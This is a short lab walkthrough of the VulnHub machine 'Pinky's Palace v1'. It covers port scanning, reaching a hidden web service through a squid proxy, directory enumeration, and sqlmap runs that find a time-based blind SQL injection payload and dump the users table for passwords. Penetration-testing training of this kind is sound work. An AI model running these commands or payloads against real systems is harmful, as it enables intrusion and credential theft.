# Pinky's Palace v1

> https://www.vulnhub.com/entry/pinkys-palace-v1,225/

`nmap 192.168.1.0/24` finds target: 192.168.1.16

`nmap -sV -sT -A -p- 192.168.1.16` finds the following services:

* nginx, 8080
* squid proxy, 31337
* ssh daemon, 64666

`curl -I 192.168.1.16:8080` returns 403
`curl -I 192.168.1.16:31337` returns 400
`curl -I --proxy 192.168.1.16:31337 127.0.0.1:8080` returns 200

the homepage says "Pinky's HTTP File Server"

enumerate the file system with:
`dirb http://127.0.0.1:8080/ /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -p 192.168.1.16:31337`

this finds two pages:
* `/littlesecrets-main` - login form
* `/littlesecrets-main/log.php` - log of login attempts

try sql injection on login form:
`sqlmap --proxy=http://192.168.1.16:31337 --data="user=admin&pass=admin" --url=http://127.0.0.1:8080/littlesecrets-main/login.php --level=5 --risk=3`

finds that the database is mysql and has the following vulnerability:
```
Parameter: User-Agent (User-Agent)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: sqlmap/1.2.3#stable (http://sqlmap.org)'||(SELECT 'jIXr' FROM DUAL WHERE 9137=9137 AND SLEEP(5))||'
```

dump the tables:
`sqlmap --dbms=mysql --dump tables --proxy=http://192.168.1.16:31337 --data="user=admin&pass=admin" --url=http://127.0.0.1:8080/littlesecrets-main/login.php --level=5 --risk=3`

sqlmap will find what it thinks are passwords in the users table and ask to store them separately in a file
